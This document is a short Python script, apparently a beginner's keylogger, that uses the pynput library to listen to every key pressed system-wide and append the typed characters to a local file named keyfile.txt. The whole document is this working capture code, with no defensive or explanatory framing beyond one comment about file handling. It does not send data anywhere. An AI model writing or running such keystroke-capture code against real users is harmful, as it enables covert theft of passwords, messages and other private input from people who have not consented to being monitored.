from pynput import keyboard


def keypressed(key):
    print(str(key))
    with open ('keyfile.txt', 'a') as log: # The "with" statement ensures that the file is properly closed when we're done writing to it.
        try:
            char = key.char
            log.write(char)
        except:
            print("error character")

if __name__ == '__main__':
    listener = keyboard.Listener(on_press= keypressed)
    listener.start()
    input()